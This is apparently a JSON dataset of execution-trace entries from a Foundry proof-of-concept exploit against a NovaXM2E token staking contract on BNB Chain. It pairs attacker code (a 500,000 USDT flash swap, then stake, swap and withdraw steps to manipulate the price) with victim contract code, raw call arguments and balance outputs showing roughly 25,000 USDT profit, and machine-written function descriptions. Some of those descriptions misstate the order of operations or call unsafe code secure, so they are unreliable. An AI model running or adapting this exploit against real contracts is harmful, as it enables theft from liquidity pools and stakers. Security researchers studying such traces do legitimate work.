[
    {
        "id": "820854",
        "args": "",
        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n        swapamount = 500_000 ether;\n        Pair.swap(swapamount, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario. It first logs the attacker's USDT balance before the exploit. Then, it performs a swap operation using a specific amount of tokens. After the swap, it logs the attacker's USDT balance again to show the impact of the exploit.\n\n2. Security mechanism:  \nThis function does not include explicit security mechanisms or modifiers. It is a test function, likely used in a controlled environment to demonstrate or analyze an exploit scenario. The lack of access control or validation suggests it is not intended for production use.\n\n3. Parameter Function:  \nThe function does not take any parameters. However, it uses predefined variables like `swapamount`, `Pair`, and `USDT` to perform the swap operation. The `swapamount` is set to a fixed value of 500,000 ether, which is used in the swap function.\n\n4. Return description:  \nThe function does not return any value. Instead, it emits two log events that display the attacker's USDT balance before and after the exploit. The balances are logged in a human-readable decimal format with 18 decimal places, which is standard for many tokens like USDT.\n\nIn summary, the `testExploit` function is a test tool used to simulate and analyze an exploit scenario by logging the attacker's USDT balance before and after a swap operation. It lacks security mechanisms and is likely used in a controlled environment for testing purposes.",
        "return_value": "Returned"
    },
    {
        "id": "2531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "781769",
        "args": "500000000000000000000000 [5e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "27971",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000000 [5e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "712381",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000000 [5e23], 0, 0x00",
        "original_code": "    function pancakeCall(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) public {\n        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));\n        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));\n        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);\n        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));\n        uint256 stakeIndex = tokenStake.stakeIndex();\n        tokenStake.withdraw(stakeIndex);\n        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));\n        USDT.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `pancakeCall` function is designed to execute a series of token swaps and staking operations. It first swaps USDT tokens for NovaXM2E tokens, then stakes half of the NovaXM2E tokens into a staking contract. After staking, it swaps the remaining NovaXM2E tokens back to USDT. Finally, it withdraws the staked tokens and performs another swap to convert them back to USDT. The function concludes by transferring a calculated amount of USDT to a specified pair address.\n\n2. **Security mechanism:**  \n   - The function is marked as `public`, meaning it can be called by any external entity.  \n   - It relies on external contracts (`USDT`, `NovaXM2E`, `tokenStake`, and `Pair`) for token transfers, approvals, and staking operations.  \n   - The function does not include explicit access control or checks for reentrancy, which could pose security risks if not handled by the external contracts.  \n\n3. **Parameter Function:**  \n   The function takes four parameters, but they are not used within the function:  \n   - `address`: Represents the sender of the transaction (unused).  \n   - `uint256 amount0` and `uint256 amount1`: Represent amounts of tokens involved in the transaction (unused).  \n   - `bytes calldata data`: Represents additional data passed to the function (unused).  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs a series of operations involving token swaps, staking, and transfers. The final step involves transferring a calculated amount of USDT to a specified pair address, which is derived from the `swapamount` variable (not defined in the provided code).  \n\nIn summary, the `pancakeCall` function orchestrates a sequence of token swaps and staking operations, but it lacks internal security mechanisms and does not utilize its input parameters. Its primary purpose is to manage token conversions and staking within a decentralized finance (DeFi) context.",
        "return_value": "Returned"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "500000000000000000000000 [5e23]"
    },
    {
        "id": "24562",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 500000000000000000000000 [5e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "107695",
        "args": "500000000000000000000000 [5e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1722917148 [1.722e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "10834",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x05a911Cc7B9e1481a795Ba548049285715a6c7BC, 500000000000000000000000 [5e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "198380116401424006229724 [1.983e23], 113649427915868639218359 [1.136e23], 1722911829 [1.722e9]"
    },
    {
        "id": "531",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "698380116401424006229724 [6.983e23]"
    },
    {
        "id": "77999",
        "args": "0, 81308569002347149065682 [8.13e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "43508",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81308569002347149065682 [8.13e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "698380116401424006229724 [6.983e23]"
    },
    {
        "id": "648",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "32340858913521490152677 [3.234e22]"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "81308569002347149065682 [8.13e22]"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "81308569002347149065682 [8.13e22]"
    },
    {
        "id": "24693",
        "args": "0x55C9EEbd368873494C7d06A4900E8F5674B11bD2, 81308569002347149065682 [8.13e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "81308569002347149065682 [8.13e22]"
    },
    {
        "id": "263211",
        "args": "0, 40654284501173574532841 [4.065e22]",
        "original_code": "    function stake(uint256 _poolId, uint256 _stakeValue) external override lock {\n        address stakeToken = stakeTokenPools[_poolId].stakeToken;\n        require(IERC20(stakeToken).balanceOf(msg.sender) >= _stakeValue, \"TS:E\");\n        require(IERC20(stakeToken).allowance(msg.sender, address(this)) >= _stakeValue, \"TS:A\");\n        require(IERC20(stakeToken).transferFrom(msg.sender, address(this), _stakeValue), \"TS:T\");\n\n        uint256 totalUserStakePool = totalUserStakedPoolToken[msg.sender][_poolId] + _stakeValue;\n        require(stakeTokenPools[_poolId].maxStakePerWallet == 0 || stakeTokenPools[_poolId].maxStakePerWallet >= totalUserStakePool, \"TS:U\");\n\n        // insert data staking\n        stakeIndex = stakeIndex + 1;\n        uint256 stakeValueUsd = tokenToUsd(stakeToken, _stakeValue);\n\n        // if pool duration = 0 => no limit for stake time, can claim every time\n        uint256 unlockTimeEstimate = stakeTokenPools[_poolId].duration == 0 ? 0 : (block.timestamp + (2592000 * stakeTokenPools[_poolId].duration));\n        stakedToken[stakeIndex].stakeId = stakeIndex;\n        stakedToken[stakeIndex].userAddress = msg.sender;\n        stakedToken[stakeIndex].poolId = _poolId;\n        stakedToken[stakeIndex].startTime = block.timestamp;\n        stakedToken[stakeIndex].lastClaimTime = block.timestamp;\n        stakedToken[stakeIndex].unlockTime = unlockTimeEstimate;\n        stakedToken[stakeIndex].totalValueStake = _stakeValue;\n        stakedToken[stakeIndex].totalValueStakeUsd = stakeValueUsd;\n        stakedToken[stakeIndex].isWithdraw = false;\n\n        // update fixed data\n        totalUserStakedPoolToken[msg.sender][_poolId] += _stakeValue;\n        totalUserStakedPoolUsd[msg.sender][_poolId] += stakeValueUsd;\n\n        payDirectCommission(msg.sender, _poolId, _stakeValue);\n        if (stakeTokenPools[_poolId].duration >= poolDurationHasLimit) {\n            IMarketplace(marketplaceContract).updateStakeTokenValue(msg.sender, stakeValueUsd, true);\n        }\n        emit Staked(stakeIndex, _poolId, msg.sender, _stakeValue, block.timestamp, unlockTimeEstimate);\n    }\n\n    function claimAll(uint256[] memory _stakeIds) external override lock {\n        require(_stakeIds.length > 0, \"TS:I\");\n        for (uint i = 0; i < _stakeIds.length; i++) {\n            claimInternal(_stakeIds[i]);\n        }\n    }\n\n    function claimPool(uint256[] memory _stakeIds) external override lock {\n        require(_stakeIds.length > 0, \"TS:I\");\n        for (uint i = 0; i < _stakeIds.length; i++) {\n            claimInternal(_stakeIds[i]);\n        }\n    }\n\n    function claim(uint256 _stakeId) external override lock {\n        claimInternal(_stakeId);\n    }\n\n",
        "description": "1. **Core functions:**\n   - **stake**: This function allows a user to stake tokens in a specific pool. It checks if the user has enough tokens and the necessary allowance, transfers the tokens to the contract, and updates the staking details. It also calculates the unlock time based on the pool's duration and emits an event to log the staking action.\n   - **claimAll**: This function enables a user to claim rewards for multiple staking IDs at once. It iterates through the provided list of staking IDs and processes each one internally.\n   - **claimPool**: Similar to `claimAll`, this function allows a user to claim rewards for multiple staking IDs, but it is specifically for staking IDs within a particular pool.\n   - **claim**: This function lets a user claim rewards for a single staking ID by processing it internally.\n\n2. **Security mechanism:**\n   - **lock modifier**: Ensures that the function cannot be re-entered, preventing reentrancy attacks.\n   - **require statements**: These checks ensure that the user has sufficient token balance and allowance, that the staking does not exceed the maximum allowed per wallet, and that the token transfer is successful.\n   - **event emission**: The `Staked` event logs the staking action, providing transparency and traceability.\n\n3. **Parameter Function:**\n   - **stake**: \n     - `_poolId`: Identifies the specific pool where the user wants to stake tokens.\n     - `_stakeValue`: The amount of tokens the user wishes to stake.\n   - **claimAll** and **claimPool**:\n     - `_stakeIds`: An array of staking IDs for which the user wants to claim rewards.\n   - **claim**:\n     - `_stakeId`: The specific staking ID for which the user wants to claim rewards.\n\n4. **Return description:**\n   - **stake**: This function does not return any value. It updates the staking details and emits an event to log the staking action.\n   - **claimAll**, **claimPool**, and **claim**: These functions also do not return any value. They process the reward claims internally and update the necessary state variables.\n\nIn summary, the provided Solidity functions handle staking and claiming rewards in a token staking system. They include security measures to prevent reentrancy and ensure valid transactions, and they use parameters to specify the details of the staking and claiming actions. The functions do not return any values but update the contract state and emit events for transparency.",
        "return_value": "Returned"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "81308569002347149065682 [8.13e22]"
    },
    {
        "id": "804",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x55C9EEbd368873494C7d06A4900E8F5674B11bD2",
        "original_code": null,
        "description": null,
        "return_value": "81308569002347149065682 [8.13e22]"
    },
    {
        "id": "20164",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x55C9EEbd368873494C7d06A4900E8F5674B11bD2, 40654284501173574532841 [4.065e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "24439",
        "args": "1000000 [1e6]",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000000000000000000000b4e4"
    },
    {
        "id": "2348",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000000f4240"
    },
    {
        "id": "2327",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000000aea2b"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "698380116401424006229724 [6.983e23], 32340858913521490152677 [3.234e22], 1722917148 [1.722e9]"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "40654284501173574532841 [4.065e22]"
    },
    {
        "id": "24693",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 40654284501173574532841 [4.065e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "66950",
        "args": "40654284501173574532841 [4.065e22], 0, [0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1722917148 [1.722e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "18777",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x05a911Cc7B9e1481a795Ba548049285715a6c7BC, 40654284501173574532841 [4.065e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "698380116401424006229724 [6.983e23], 32340858913521490152677 [3.234e22], 1722917148 [1.722e9]"
    },
    {
        "id": "648",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "56733429614225634872382 [5.673e22]"
    },
    {
        "id": "38378",
        "args": "299840552029131262978859 [2.998e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23171",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 299840552029131262978859 [2.998e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "398539564372292743250865 [3.985e23]"
    },
    {
        "id": "648",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "56733429614225634872382 [5.673e22]"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "299840552029131262978859 [2.998e23]"
    },
    {
        "id": "407",
        "args": "",
        "original_code": "",
        "description": "",
        "return_value": "692"
    },
    {
        "id": "104024",
        "args": "692",
        "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `withdraw` function allows a user to withdraw a specified amount of tokens (referred to as `wad`) from their account. It checks if the user has enough balance, deducts the amount from their balance, and then transfers the tokens to the user's address. Finally, it logs the withdrawal event for tracking purposes.\n\n2. **Security mechanism:**  \n   - `require(balanceOf[msg.sender] >= wad);`: Ensures the user has sufficient balance before proceeding with the withdrawal, preventing overdrafts.  \n   - `msg.sender.transfer(wad);`: Safely transfers the specified amount of tokens to the user's address, ensuring the transaction is secure.  \n   - The function is marked as `public`, meaning it can be called by anyone, but the `require` statement acts as a safeguard to prevent unauthorized or invalid withdrawals.\n\n3. **Parameter Function:**  \n   - `uint wad`: This parameter represents the amount of tokens the user wants to withdraw. It must be a positive number and cannot exceed the user's current balance.\n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs actions: it deducts the specified amount from the user's balance, transfers the tokens to the user, and emits an event (`Withdrawal`) to record the transaction.\n\n**In summary,**  \nThe `withdraw` function securely allows users to withdraw tokens from their account, ensuring they have enough balance and logging the transaction. It uses checks and safeguards to prevent errors or misuse.",
        "return_value": "Returned"
    },
    {
        "id": "2460",
        "args": "0000000000000000000000000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
    },
    {
        "id": "5052",
        "args": "0",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "5075",
        "args": "0",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "3077",
        "args": "0",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000001f40"
    },
    {
        "id": "5939",
        "args": "877910609423287002955018 [8.779e23]",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000001a76d38efe90893b5078"
    },
    {
        "id": "348",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000000f4240"
    },
    {
        "id": "327",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x00000000000000000000000000000000000000000000000000000000000aea2b"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "398539564372292743250865 [3.985e23], 56733429614225634872382 [5.673e22], 1722917148 [1.722e9]"
    },
    {
        "id": "648",
        "args": "0x55C9EEbd368873494C7d06A4900E8F5674B11bD2",
        "original_code": null,
        "description": null,
        "return_value": "1587299938507877059681354 [1.587e24]"
    },
    {
        "id": "28597",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 124973488756993929465976 [1.249e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "648",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "124973488756993929465976 [1.249e23]"
    },
    {
        "id": "22593",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 124973488756993929465976 [1.249e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "38250",
        "args": "124973488756993929465976 [1.249e23], 0, [0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1722917148 [1.722e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "9977",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x05a911Cc7B9e1481a795Ba548049285715a6c7BC, 124973488756993929465976 [1.249e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "299840552029131262978859 [2.998e23]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "398539564372292743250865 [3.985e23], 56733429614225634872382 [5.673e22], 1722917148 [1.722e9]"
    },
    {
        "id": "648",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "131717522868421992551968 [1.317e23]"
    },
    {
        "id": "18478",
        "args": "226635773932420075856278 [2.266e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3271",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 226635773932420075856278 [2.266e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "171903790439872667394587 [1.719e23]"
    },
    {
        "id": "648",
        "args": "0x05a911Cc7B9e1481a795Ba548049285715a6c7BC",
        "original_code": null,
        "description": null,
        "return_value": "131717522868421992551968 [1.317e23]"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "526476325961551338835137 [5.264e23]"
    },
    {
        "id": "3271",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 501253132832080200502253 [5.012e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
        "original_code": null,
        "description": null,
        "return_value": "2708487695961559773112968 [2.708e24]"
    },
    {
        "id": "2531",
        "args": "0x7EFaEf62fDdCCa950418312c6C91Aef321375A00",
        "original_code": null,
        "description": null,
        "return_value": "2703936419557201237142654 [2.703e24]"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "25223193129471138332884 [2.522e22]"
    }
]